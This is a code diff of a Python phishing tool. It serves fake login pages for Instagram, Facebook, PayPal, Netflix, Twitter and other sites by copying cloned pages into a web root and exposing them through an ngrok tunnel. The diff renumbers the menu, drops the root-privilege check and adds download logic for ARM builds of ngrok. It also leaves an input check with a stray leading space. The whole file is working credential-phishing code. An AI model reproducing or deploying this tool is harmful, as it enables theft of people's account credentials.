@@ -16,13 +16,11 @@ from bs4 import BeautifulSoup
 from colorama import init, Fore, Back,Style
 import sys
 from requests.exceptions import ConnectionError
+import subprocess
 
 
 if os.name == "nt":
     sys.exit('Windows Sucks...!!!!')
-   
-if os.geteuid() != 0:
-    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
 
 os.system("killall -2 ngrok > /dev/null 2>&1")
 os.system("killall -2 php > /dev/null 2>&1")
@@ -44,18 +42,17 @@ print("""
 
                 (1) Instagram
                 (2) Facebook
-                (3) Instafollowers
-                (4) Linkedin
-                (5) Messenger
-                (6) MySpace
-                (7) netflix
-                (8) Paypal
-                (9) Pinterest
-                (10) Snapchat
-                (11) Spotify
-                (12) Twitch
-                (13) Twitter
-                (14) Wordpress
+                (3) Linkedin
+                (4) Messenger
+                (5) MySpace
+                (6) netflix
+                (7) Paypal
+                (8) Pinterest
+                (9) Snapchat
+                (10) Spotify
+                (11) Twitch
+                (12) Twitter
+                (13) Wordpress
 
     """)
 
@@ -71,39 +68,36 @@ def again():
             os.system("cp -r 'sites/facebook'/* './'")
             server = "facebook"
         elif i == "3":
-            os.system("cp -r 'sites/instafollowers'/* './'")
-            server = "facebook"
+            os.system("cp -r 'sites/Linkedin'/* './'")
+            server = "Linkedin"
         elif i == "4":
-            os.system("cp -r 'sites/linkedin'/* './'")
-            server = "facebook"
+            os.system("cp -r 'sites/Messenger'/* './'")
+            server = "Messenger"
         elif i == " 5":
-            os.system("cp -r 'sites/messenger'/* './'")
-            server = "messenger"
-        elif i == "6":
             os.system("cp -r 'sites/myspace'/* './'")
             server = "myspace"
-        elif i == "7":
+        elif i == "6":
             os.system("cp -r 'sites/netflix'/* './'")
             server = "netflix"
-        elif i == "8":
+        elif i == "7":
             os.system("cp -r 'sites/paypal'/* './'")
             server = "paypal"
-        elif i == "9":
+        elif i == "8":
             os.system("cp -r 'sites/pinterest'/* './'")
             server = "pinterest"
-        elif i == "10":
+        elif i == "9":
             os.system("cp -r 'sites/snapchat'/* './'")
             server = "snapchat"
-        elif i == "11":
+        elif i == "10":
             os.system("cp -r 'sites/spotify'/* './'")
             server = "spotify"
-        elif i == "12":
+        elif i == "11":
             os.system("cp -r 'sites/twitch'/* './'")
             server = "twitch"
-        elif i == "13":
+        elif i == "12":
             os.system("cp -r 'sites/twitter'/* './'")
             server = "twitter"
-        elif i == "14":
+        elif i == "13":
             os.system("cp -r 'sites/wordpress'/* './'")
             server = "wordpress"
         else:
@@ -114,12 +108,25 @@ def again():
         print(Style.BRIGHT+Fore.GREEN+"[+]Checking if Ngrok exist or not... :)"+Style.RESET_ALL)
         time.sleep(2)
         if (os.path.isfile('ngrok') == False):
-            print(Style.BRIGHT+Fore.GREEN+"[+]Downloading......"+Style.RESET_ALL)
-            url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
-            file = wget.download(url)
-            print(Style.BRIGHT + Fore.GREEN + "\n[+]Downloaded..." + Style.RESET_ALL)
-            os.system("unzip ngrok-stable-linux-386.zip  > /dev/null")
-            os.system("rm -rf ngrok-stable-linux-386.zip")
+            output = subprocess.check_output("dpkg --print-architecture", shell=True)
+            if 'aarch64' in output:
+                print(Style.BRIGHT + Fore.GREEN + "[+]Downloading......" + Style.RESET_ALL)
+                url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
+                file = wget.download(url)
+                print(Style.BRIGHT + Fore.GREEN + "\n[+]Downloaded..." + Style.RESET_ALL)
+                os.system("unzip ngrok-stable-linux-arm.zip  > /dev/null")
+                os.system("rm -rf ngrok-stable-linux-arm.zip")
+            else:
+                print(Style.BRIGHT + Fore.GREEN + "[+]Downloading......" + Style.RESET_ALL)
+                url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
+                file = wget.download(url)
+                print(Style.BRIGHT + Fore.GREEN + "\n[+]Downloaded..." + Style.RESET_ALL)
+                os.system("unzip ngrok-stable-linux-386.zip  > /dev/null")
+                os.system("rm -rf ngrok-stable-linux-386.zip")
+
+
+
+
 
 
         else:
